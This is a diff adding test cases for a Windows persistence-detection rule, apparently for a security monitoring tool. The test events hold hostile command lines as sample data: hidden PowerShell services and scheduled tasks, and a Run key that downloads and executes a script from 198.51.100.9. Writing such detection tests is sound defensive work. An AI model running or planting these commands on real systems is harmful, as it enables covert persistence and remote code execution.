@@ -16,6 +16,30 @@ cases:
     expect_incidents: [persist_suspicious_autostart]
     events:
       - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\sc.exe', OriginalFileName: sc.exe, CommandLine: 'sc create UpdSvc binPath= "cmd.exe /c C:\Users\Public\svc.exe" start= auto', User: 'LAB\admin'}
+  - name: positive_service_4697_runs_powershell
+    expect_incidents: [persist_suspicious_autostart]
+    events:
+      - event: {EventID: 4697, Channel: Security, ServiceName: WinUpdHelper, ServiceFileName: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "iex (gc C:\ProgramData\u.txt -Raw)"', ServiceType: '0x10', ServiceStartType: 2, ServiceAccount: LocalSystem, SubjectUserName: admin}
+  - name: positive_schtasks_powershell_from_programdata
+    expect_incidents: [persist_suspicious_autostart]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\schtasks.exe', OriginalFileName: schtasks.exe, CommandLine: 'schtasks /create /sc onlogon /tn UpdCheck /tr "powershell -w hidden -f C:\ProgramData\u.ps1"', User: 'LAB\admin'}
+  - name: positive_run_key_hidden_powershell
+    expect_incidents: [persist_suspicious_autostart]
+    events:
+      - event: {EventID: 13, Channel: Microsoft-Windows-Sysmon/Operational, EventType: SetValue, Image: 'C:\Windows\System32\reg.exe', TargetObject: 'HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\Run\Updater', Details: 'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(''http://198.51.100.9/a'')"', User: 'LAB\victim'}
+  - name: positive_schtasks_once_from_temp
+    expect_incidents: [persist_suspicious_autostart]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\schtasks.exe', OriginalFileName: schtasks.exe, CommandLine: 'schtasks /create /sc once /st 23:59 /tn t1 /tr C:\Users\victim\AppData\Local\Temp\t.exe', User: 'LAB\victim'}
+  - name: positive_new_service_from_public
+    expect_incidents: [persist_suspicious_autostart]
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, CommandLine: 'powershell -c New-Service -Name UpdSvc -BinaryPathName C:\Users\Public\svc.exe', User: 'LAB\admin'}
+  - name: negative_new_service_from_tools_dir
+    expect_incidents: []
+    events:
+      - event: {EventID: 1, Channel: Microsoft-Windows-Sysmon/Operational, Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', OriginalFileName: PowerShell.EXE, CommandLine: 'powershell -c New-Service -Name MaintSvc -BinaryPathName C:\Tools\maintsvc.exe', User: 'LAB\admin'}
   - name: negative_run_key_to_program_files
     expect_incidents: []
     events:
